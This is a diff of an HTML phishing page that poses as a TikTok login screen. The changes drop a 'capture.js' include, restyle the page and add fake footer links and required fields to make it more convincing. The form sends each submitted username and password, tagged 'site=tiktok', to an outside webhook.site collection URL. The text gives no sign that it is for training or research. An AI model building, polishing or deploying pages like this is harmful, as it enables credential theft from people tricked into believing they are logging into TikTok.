@@ -1,25 +1,78 @@
 <html>
 <head>
-    <script src="capture.js"></script>
     <title>TikTok</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: Arial, sans-serif; background: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; }
-        .container { text-align: center; width: 350px; }
-        .logo { font-size: 50px; font-weight: bold; margin-bottom: 30px; }
-        input[type="text"], input[type="password"] { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #333; border-radius: 4px; font-size: 16px; background: #222; color: white; }
-        input[type="submit"] { background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 4px; width: 100%; font-weight: bold; font-size: 16px; margin-top: 20px; }
-        .header { font-size: 24px; margin-bottom: 30px; color: #fff; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #000;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            width: 350px;
+        }
+        .logo {
+            font-size: 42px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        .header {
+            font-size: 24px;
+            margin-bottom: 30px;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 1px solid #333;
+            border-radius: 4px;
+            font-size: 16px;
+            background: #222;
+            color: white;
+        }
+        input[type="submit"] {
+            background: #fe2c55;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 4px;
+            width: 100%;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .footer {
+            margin-top: 20px;
+            color: #666;
+            font-size: 12px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">tik tok</div>
         <div class="header">Log in</div>
+
         <form action="https://webhook.site/ac3017bb-31ec-446c-ba45-5b13aae5c7fb" method="POST">
-            <input type="text" name="username" placeholder="Username or email">
-            <input type="password" name="password" placeholder="Password">
+            <input type="hidden" name="site" value="tiktok">
+            <input type="text" name="username" placeholder="Username or email" required>
+            <input type="password" name="password" placeholder="Password" required>
             <input type="submit" value="Log in">
-        <input type="hidden" name="site" value="tiktok"></form>
+        </form>
+
+        <div class="footer">
+            <a href="#" style="color: #fe2c55; text-decoration: none;">Forgot password?</a> ·
+            <a href="#" style="color: #fe2c55; text-decoration: none;">Sign up</a>
+            <p>© 2024 TikTok</p>
+        </div>
     </div>
 </body>
 </html>
